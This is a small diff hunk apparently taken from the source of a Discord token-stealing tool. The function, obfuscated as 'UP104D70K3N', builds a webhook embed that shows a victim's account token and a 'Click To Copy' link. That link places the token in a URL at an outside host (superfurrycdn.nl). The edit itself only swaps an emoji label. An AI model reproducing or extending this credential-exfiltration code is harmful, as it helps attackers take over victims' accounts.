@@ -526,7 +526,7 @@ def UP104D70K3N(token, path):
             "color": color,
             "fields": [
                 {
-                    "name": "<:hackerblack:1095747410539593800> Token:",
+                    "name": "<:blackkeyicon7:1221556971636002826> Token:",
                     "value": f"`{token}`\n[Click To Copy](https://superfurrycdn.nl/copy/{token})"
                 },
                 {
